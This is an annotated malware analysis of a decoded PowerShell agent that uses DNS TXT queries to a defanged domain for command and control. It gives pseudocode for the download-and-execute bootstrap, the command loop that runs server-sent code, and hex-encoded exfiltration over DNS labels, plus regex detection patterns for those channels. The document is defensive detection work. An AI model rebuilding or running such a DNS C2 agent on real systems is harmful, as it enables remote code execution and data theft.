# Decoded agent — annotated analysis

> Defensive analysis artifact. The C2 domain is defanged (`ostrykebs[.]pl`) and this file
> documents the agent's **structure and behavior** rather than shipping a runnable implant.
> Anyone reproducing can reassemble the original from the source capture (see
> `../methodology/commands.md`).

The 17 base64 chunks served on the `l.<n>.ns` channel reassemble into a ~3 KB PowerShell
DNS C2 agent. The pieces that matter for detection and impact:

## Bootstrap (served plaintext on `l.ns`)
A download cradle that walks the load channel, pulls the payload delimited by `@…@` from each
TXT record, base64-decodes, concatenates, and executes:

```
loop i = 1..N:
    txt = nslookup -q=txt  l.<i>.ns.ostrykebs[.]pl
    if txt matches @(.*)@:  str += base64_decode( match )
    else: break
iex str          # <-- assembled agent runs here (T1059.001 / T1140)
```

## Transport primitives
- `getTXT($name)` — shells out to **`nslookup -q=txt`** and scrapes the answer. The agent
  never opens a socket; on the endpoint this surfaces as **powershell.exe spawning
  nslookup.exe** in a tight loop. This is the single highest-fidelity host signal.
- `enc($data)` — **hex-encodes** output bytes (`{0:x2}` per byte). Used to pack command
  results into DNS-label-safe characters.
- `crc($d)` — simple additive checksum the agent uses to confirm the server received each
  result chunk.

## Beacon / command loop
```
session = Random(0..50000)          # = 24006 in this capture
base = "<session>.ns.ostrykebs[.]pl"
loop:
    resp = getTXT("c.<cid>-<partid>.<base>")     # poll for tasking
    fields = resp.split("|", 4)  ->  (cid, part, parts, cmd)
    accumulate cmd parts ...
    data = base64_decode(assembled)
    result = IEX data                            # <-- server-controlled RCE
    sendResult(result, cid)                      # hex-encode + chunk over r.<hex>... queries
```

## Why the behavioral rules target the label grammar
The randomized session id defeats naive per-host signatures, but the **channel grammar is
static**:
- load: `^l\.\d+\.ns\.`
- command: `^c\.\d+-\d+\.\d+\.ns\.`
- result/exfil: `^r\.` followed by long hex label runs

Those shapes — plus PowerShell→nslookup on the endpoint — are what `/detections` keys on, so
the logic holds even if the operator rotates the domain.
